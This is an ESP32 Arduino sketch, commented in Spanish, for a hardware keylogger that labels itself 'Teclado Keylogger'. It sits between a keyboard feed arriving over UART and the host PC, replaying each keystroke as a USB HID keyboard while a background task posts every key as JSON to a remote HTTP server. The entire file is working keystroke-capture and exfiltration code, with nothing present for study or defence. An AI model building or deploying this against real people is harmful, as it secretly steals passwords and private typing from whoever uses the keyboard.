#include "USB.h"
#include "USBHIDKeyboard.h"
#include <WiFi.h>
#include <HTTPClient.h>
#include "freertos/queue.h"

// ====== Objetos principales ======
USBHIDKeyboard Keyboard;   // Controlador HID para emular teclado

// ====== Configuración UART ======
#define RX_PIN 18
#define TX_PIN 17
#define BAUD_RATE 9600

// ====== Configuración WiFi ======
const char* ssid     = "";  // Nombre de la red WiFi
const char* password = "";  // Contraseña de la red WiFi

// ====== Configuración del servidor ======
const char* serverURL = "http://192.168.1.43:5555/key";  // IP y puerto del servidor receptor

// ====== Comandos especiales (no ASCII) ======
#define CMD_ESC        0x1B
#define CMD_TAB        0x09
#define CMD_CAPS       0x14
#define CMD_BACKSPACE  0x08
#define CMD_ENTER      0x0A
#define CMD_GUI        0x90
#define CMD_ALTGR      0x92   // AltGr (Right Alt)

// ====== Tabla de equivalencias de comandos ======
typedef struct {
  uint8_t command;
  uint8_t keycode;
} CommandMap;

CommandMap commandMap[] = {
  {CMD_ESC,       KEY_ESC},
  {CMD_TAB,       KEY_TAB},
  {CMD_CAPS,      KEY_CAPS_LOCK},
  {CMD_BACKSPACE, KEY_BACKSPACE},
  {CMD_ENTER,     KEY_RETURN}
};

const uint8_t commandCount = sizeof(commandMap) / sizeof(CommandMap);

// ====== Cola para envío de teclas al servidor ======
QueueHandle_t keyQueue;

// =====================================================================
// ====================== TAREA DE ENVÍO AL SERVIDOR ===================
// =====================================================================
// Esta tarea corre en segundo plano. Toma las teclas de la cola y las
// envía al servidor HTTP de forma ordenada y no bloqueante.
// =====================================================================
void serverTask(void* parameter) {
  String key;
  for (;;) {
    if (xQueueReceive(keyQueue, &key, portMAX_DELAY) == pdTRUE) {
      if (WiFi.status() == WL_CONNECTED) {
        HTTPClient http;
        http.setTimeout(1000);  // Timeout máximo 1s

        if (http.begin(serverURL)) {
          http.addHeader("Content-Type", "application/json");
          String json = "{\"key\":\"" + key + "\"}";
          http.POST(json);
          http.end();
        }
      }
    }
  }
}

// =====================================================================
// ========================== CONTROL HID ===============================
// =====================================================================

// Simula la pulsación y liberación de una tecla
void pressAndRelease(uint8_t key) {
  Keyboard.press(key);
  Keyboard.release(key);
}

// Envía la tecla a la cola para que el servidor la procese luego
void sendLater(const String& key) {
  xQueueSend(keyQueue, &key, 0);  // No bloquea, descarta si la cola está llena
}

// Verifica si el byte recibido es un comando especial
bool isSpecialCommand(uint8_t cmd) {
  if (cmd == CMD_GUI || cmd == CMD_ALTGR) return true;
  for (int i = 0; i < commandCount; i++) {
    if (cmd == commandMap[i].command) return true;
  }
  return false;
}

// Ejecuta acciones según el comando especial recibido
void handleSpecialCommand(uint8_t cmd) {
  for (int i = 0; i < commandCount; i++) {
    if (cmd == commandMap[i].command) {
      pressAndRelease(commandMap[i].keycode);
      sendLater(String(commandMap[i].keycode)); 
      return;
    }
  }

  // Tecla GUI (Windows)
  if (cmd == CMD_GUI) {
    pressAndRelease(KEY_LEFT_GUI);
    sendLater("GUI");
  }

  // Tecla AltGr
  if (cmd == CMD_ALTGR) {
    pressAndRelease(KEY_RIGHT_ALT);
    sendLater("ALTGR");
  }
}

// =====================================================================
// ============================ SETUP ==================================
// =====================================================================
void setup() {
  // Inicializar UART secundaria
  Serial1.begin(BAUD_RATE, SERIAL_8N1, RX_PIN, TX_PIN);
  
  // Personalizar nombre del dispositivo USB
  USB.productName("Teclado Keylogger");
  USB.begin();

  // Inicializar teclado HID
  Keyboard.begin();
  delay(500);

  // Intentar conexión WiFi (20 intentos)
  WiFi.begin(ssid, password);
  int retries = 0;
  while (WiFi.status() != WL_CONNECTED && retries < 20) {
    delay(500);
    retries++;
  }

  // Crear cola y tarea para el envío de teclas al servidor
  keyQueue = xQueueCreate(32, sizeof(String));
  xTaskCreatePinnedToCore(serverTask, "ServerTask", 4096, NULL, 1, NULL, 1);
}

// =====================================================================
// ============================= LOOP ==================================
// =====================================================================
// Lee bytes del UART, interpreta si son comandos especiales o teclas
// normales, y los envía al PC (como teclado) y al servidor (por HTTP).
// =====================================================================
void loop() {
  if (Serial1.available()) {
    uint8_t c = Serial1.read();

    // Comando especial (ESC, TAB, GUI, etc.)
    if (isSpecialCommand(c)) {
      handleSpecialCommand(c);
    } 
    // Caracter ASCII imprimible
    else if (c >= 0x20 && c <= 0x7E) {
      // Caso especial: '@' en layout español-latino
      if (c == '@') {
        Keyboard.press(KEY_RIGHT_ALT);
        Keyboard.press('q');
        Keyboard.release('q');
        Keyboard.release(KEY_RIGHT_ALT);
        sendLater("@");
      } else {
        Keyboard.write((char)c);
        sendLater(String((char)c));
      }
    }
  }

  // Pequeño retardo para ceder tiempo al planificador de FreeRTOS
  delay(1);
}
